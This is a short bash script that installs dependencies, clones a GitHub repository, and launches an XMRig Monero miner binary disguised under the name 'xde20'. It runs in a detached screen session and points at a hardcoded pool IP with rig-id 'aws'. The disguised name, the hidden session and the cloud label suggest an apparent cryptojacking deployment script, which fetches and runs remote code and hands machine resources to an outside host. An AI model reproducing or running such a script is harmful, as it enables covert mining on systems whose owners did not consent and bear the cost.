#!/bin/bash
apt-get update
apt-get install -y screen git libuv1-dev libssl-dev libhwloc-dev
git clone https://github.com/yuqingkj/xmrig_debain.git
cd xmrig_debain/
chmod 777 ./xde20
screen -dmS xmr
cmd=$"./xde20 -o 106.75.47.32:3333 --rig-id aws -t 8";
screen -x -S xmr -p 0 -X stuff "$cmd\n"
echo ok
